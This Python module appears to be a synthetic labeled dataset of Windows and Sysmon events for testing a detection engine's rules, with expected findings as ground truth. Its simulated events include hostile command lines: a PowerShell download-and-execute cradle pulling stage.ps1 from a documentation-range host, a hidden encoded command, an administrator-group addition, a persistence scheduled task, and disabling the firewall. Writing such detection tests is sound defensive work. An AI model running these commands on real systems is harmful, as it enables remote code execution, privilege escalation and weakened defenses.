"""Labeled synthetic dataset that exercises every detection rule.

For each rule it contains:

* **positives**: events the rule must report;
* **lookalikes**: events that resemble suspicious activity but must NOT be
  reported (they guard against false positives);
* **edge cases**: threshold boundaries, missing context, aggregation.

``EXPECTED_FINDINGS`` is the ground truth: for each rule, the exact sets of
event IDs that should form one finding each. Tests compare the engine's
output against it, so any change in rule behavior shows up as a failure.

Note: AEGIS-PERS-001 is *expected* to flag syn-lab-053 (a backup agent
installing its service). The rule cannot know the software is legitimate;
this documents a known false-positive pattern that ``allowed_names`` tunes.

All addresses are private (10.0.0.0/8) or RFC 5737 documentation ranges.
"""

from datetime import UTC, datetime, timedelta
from typing import Any

START = datetime(2026, 10, 8, 9, 0, tzinfo=UTC)  # the day after the baseline dataset ends
SCENARIO = "detection-lab"

ENCODED = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


def _event(number: int, offset_seconds: int, event_type: str, **fields: Any) -> dict[str, Any]:
    timestamp = START + timedelta(seconds=offset_seconds)
    return {
        "event_id": f"syn-lab-{number:03d}",
        "timestamp": timestamp.isoformat().replace("+00:00", "Z"),
        "event_source": fields.pop("event_source", "windows-security"),
        "event_type": event_type,
        "scenario_id": SCENARIO,
        **fields,
    }


def _ids(*numbers: int) -> tuple[str, ...]:
    return tuple(f"syn-lab-{n:03d}" for n in numbers)


def _process(
    number: int, offset: int, host: str, user: str, image: str, parent: str, command: str
) -> dict[str, Any]:
    return _event(
        number, offset, "process_creation",
        event_source="sysmon", windows_event_id=1, hostname=host, username=user,
        process_name=image, parent_process_name=parent, process_command_line=command,
    )  # fmt: skip


def _connection(
    number: int, offset: int, host: str, image: str, destination: str, port: int
) -> dict[str, Any]:
    return _event(
        number, offset, "network_connection",
        event_source="sysmon", windows_event_id=3, hostname=host, process_name=image,
        destination_ip=destination, destination_port=port,
    )  # fmt: skip


def generate_detection_lab() -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    add = events.append

    # --- AEGIS-AUTH-001: repeated failures for one account ------------------
    # Positive: 7 failures for j.martin in 2 minutes, then a success.
    for i, offset in enumerate(range(0, 121, 20), start=1):
        add(_event(i, offset, "authentication_failure", windows_event_id=4625, hostname="dc-01",
                   username="j.martin", source_ip="10.10.1.99"))  # fmt: skip
    add(_event(8, 150, "authentication_success", windows_event_id=4624, hostname="dc-01",
               username="j.martin", source_ip="10.10.1.99"))  # fmt: skip
    # Lookalike: 4 failures, one below the threshold.
    for number, offset in zip(range(10, 14), (600, 660, 720, 780), strict=True):
        add(_event(number, offset, "authentication_failure", windows_event_id=4625,
                   hostname="dc-01", username="l.garcia", source_ip="10.10.1.31"))  # fmt: skip
    # Edge: 5 failures, but 400 s apart, so never 5 inside one 300 s window.
    for number, offset in zip(range(14, 19), range(1800, 3401, 400), strict=True):
        add(_event(number, offset, "authentication_failure", windows_event_id=4625,
                   hostname="dc-01", username="r.silva", source_ip="10.10.1.51"))  # fmt: skip

    # --- AEGIS-AUTH-002: one source, many accounts ---------------------------
    # Positive: one attempt each against 6 accounts from one external address.
    sprayed = ("a.kowalski", "j.martin", "s.nakamura", "m.okafor", "l.garcia", "e.lindqvist")
    for number, (offset, user) in enumerate(zip(range(3600, 3751, 30), sprayed, strict=True), 20):
        add(_event(number, offset, "authentication_failure", windows_event_id=4625,
                   hostname="vpn-01", username=user, source_ip="198.51.100.23"))  # fmt: skip
    # Lookalike: an admin mistyping three different admin accounts.
    for number, (offset, user) in enumerate(
        zip((4000, 4010, 4020), ("p.novak", "admin", "administrator"), strict=True), 26
    ):
        add(_event(number, offset, "authentication_failure", windows_event_id=4625,
                   hostname="dc-01", username=user, source_ip="10.10.1.41"))  # fmt: skip

    # --- AEGIS-EXEC-001: suspicious PowerShell -------------------------------
    add(_process(30, 4200, "ws-fin-02", "j.martin", "powershell.exe", "cmd.exe",
                 f"powershell.exe -nop -w hidden -enc {ENCODED}"))  # fmt: skip
    add(_process(31, 4260, "ws-fin-02", "j.martin", "powershell.exe", "cmd.exe",
                 "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object "
                 "Net.WebClient).DownloadString('http://203.0.113.50/stage.ps1')\""))  # fmt: skip
    # Lookalikes: ordinary administrative PowerShell.
    add(_process(32, 4300, "file-01", "p.novak", "powershell.exe", "explorer.exe",
                 "powershell.exe -NoProfile -ExecutionPolicy RemoteSigned "
                 "-File C:\\Scripts\\inventory.ps1"))  # fmt: skip
    add(_process(33, 4320, "file-01", "p.novak", "pwsh.exe", "explorer.exe",
                 "pwsh.exe -Command Get-Process"))  # fmt: skip

    # --- AEGIS-NET-001: outbound connections ----------------------------------
    # Positive: PowerShell talking to the internet on a normal port (script host only).
    add(_connection(35, 4262, "ws-fin-02", "powershell.exe", "203.0.113.50", 80))
    # Positive (aggregated, high): rundll32 beaconing to a non-standard port.
    for number, offset in zip((36, 37, 38), (5000, 5060, 5120), strict=True):
        add(_connection(number, offset, "ws-eng-01", "rundll32.exe", "198.51.100.66", 4444))
    # Lookalikes: a browser on 443, PowerShell to an internal file server.
    add(_connection(39, 5200, "ws-eng-01", "msedge.exe", "203.0.113.10", 443))
    add(_connection(40, 5210, "file-01", "powershell.exe", "10.10.0.30", 445))
    # Edge: normal process, unusual port -> port condition only (medium).
    add(_connection(41, 5300, "ws-eng-02", "svchost.exe", "203.0.113.77", 8443))

    # --- AEGIS-PROC-001: process relationships --------------------------------
    add(_process(42, 5400, "ws-hr-01", "l.garcia", "cmd.exe",
                 "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                 "cmd.exe /c whoami /all"))  # fmt: skip
    add(_process(43, 5460, "srv-web-01", "IIS APPPOOL\\DefaultAppPool", "powershell.exe",
                 "c:\\windows\\system32\\inetsrv\\w3wp.exe",
                 "powershell.exe -Command Get-ChildItem C:\\inetpub"))  # fmt: skip
    add(_process(44, 5520, "ws-sales-01", "r.silva", "C:\\Users\\Public\\svchost.exe",
                 "C:\\Windows\\explorer.exe",
                 "C:\\Users\\Public\\svchost.exe -k netsvcs"))  # fmt: skip
    # Lookalikes: Explorer opening Word; the real svchost from System32.
    add(_process(45, 5580, "ws-hr-01", "l.garcia",
                 "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                 "C:\\Windows\\explorer.exe", "WINWORD.EXE /n report.docx"))  # fmt: skip
    add(_process(46, 5600, "ws-sales-01", "SYSTEM", "C:\\Windows\\System32\\svchost.exe",
                 "C:\\Windows\\System32\\services.exe",
                 "C:\\Windows\\System32\\svchost.exe -k netsvcs"))  # fmt: skip

    # --- AEGIS-PRIV-001: privileged group changes -----------------------------
    add(_event(47, 6000, "group_membership_change", windows_event_id=4732, hostname="dc-01",
               username="p.novak", group_name="Administrators", member_name="svc_tmp"))  # fmt: skip
    add(_process(48, 6060, "ws-sales-01", "r.silva", "net.exe", "cmd.exe",
                 "net localgroup administrators helpdesk /add"))  # fmt: skip
    # Lookalikes: a non-privileged group; listing (not changing) administrators.
    add(_event(49, 6120, "group_membership_change", windows_event_id=4732, hostname="dc-01",
               username="p.novak", group_name="Finance-Readers",
               member_name="a.kowalski"))  # fmt: skip
    add(_process(50, 6180, "ws-it-01", "p.novak", "net.exe", "cmd.exe",
                 "net localgroup administrators"))  # fmt: skip

    # --- AEGIS-PERS-001: persistence ------------------------------------------
    add(_event(51, 6600, "scheduled_task_created", windows_event_id=4698,
               hostname="ws-sales-01", username="r.silva",
               task_name="\\Microsoft\\Windows\\UpdateCheck"))  # fmt: skip
    add(_event(52, 6660, "registry_modification", event_source="sysmon", windows_event_id=13,
               hostname="ws-sales-01", username="r.silva",
               registry_key="HKU\\S-1-5-21-1000\\Software\\Microsoft\\Windows\\CurrentVersion"
                            "\\Run\\Updater"))  # fmt: skip
    # Expected but benign: legitimate backup software installing its service.
    add(_event(53, 6720, "service_installed", event_source="windows-system",
               windows_event_id=7045, hostname="file-01", username="p.novak",
               service_name="CorpBackupAgent",
               service_file_name="C:\\Program Files\\CorpBackup\\backup-agent.exe"))  # fmt: skip
    add(_process(54, 6780, "ws-sales-01", "r.silva", "schtasks.exe", "cmd.exe",
                 "schtasks.exe /create /tn Updater /tr C:\\Users\\Public\\upd.exe "
                 "/sc onlogon"))  # fmt: skip
    # Lookalikes: an ordinary Office setting; querying (not creating) tasks.
    add(_event(55, 6840, "registry_modification", event_source="sysmon", windows_event_id=13,
               hostname="ws-hr-01", username="l.garcia",
               registry_key="HKU\\S-1-5-21-1001\\Software\\Microsoft\\Office\\16.0\\Word"
                            "\\Options\\AutoSave"))  # fmt: skip
    add(_process(56, 6900, "ws-it-01", "p.novak", "schtasks.exe", "cmd.exe",
                 "schtasks.exe /query /fo LIST"))  # fmt: skip

    # --- AEGIS-DEF-001: weakened defenses -------------------------------------
    add(_event(57, 7200, "security_config_change", event_source="defender",
               hostname="ws-sales-01", username="r.silva",
               control="defender_realtime_protection", new_state="disabled"))  # fmt: skip
    add(_event(58, 7260, "log_cleared", windows_event_id=1102, hostname="ws-sales-01",
               username="r.silva", log_name="Security"))  # fmt: skip
    add(_process(59, 7320, "ws-sales-01", "r.silva", "netsh.exe", "cmd.exe",
                 "netsh.exe advfirewall set allprofiles state off"))  # fmt: skip
    # Lookalikes: turning the firewall ON; only reading firewall state.
    add(_event(60, 7380, "security_config_change", event_source="windows-firewall",
               hostname="ws-it-01", username="p.novak",
               control="windows_firewall", new_state="enabled"))  # fmt: skip
    add(_process(61, 7440, "ws-it-01", "p.novak", "netsh.exe", "cmd.exe",
                 "netsh.exe advfirewall show allprofiles"))  # fmt: skip

    return sorted(events, key=lambda e: (e["timestamp"], e["event_id"]))


# Ground truth: rule ID -> one tuple of event IDs per expected finding.
EXPECTED_FINDINGS: dict[str, set[tuple[str, ...]]] = {
    "AEGIS-AUTH-001": {_ids(1, 2, 3, 4, 5, 6, 7, 8)},
    "AEGIS-AUTH-002": {_ids(20, 21, 22, 23, 24, 25)},
    "AEGIS-EXEC-001": {_ids(30), _ids(31)},
    "AEGIS-NET-001": {_ids(35), _ids(36, 37, 38), _ids(41)},
    "AEGIS-PROC-001": {_ids(42), _ids(43), _ids(44)},
    "AEGIS-PRIV-001": {_ids(47), _ids(48)},
    "AEGIS-PERS-001": {_ids(51), _ids(52), _ids(53), _ids(54)},
    "AEGIS-DEF-001": {_ids(57), _ids(58), _ids(59)},
}
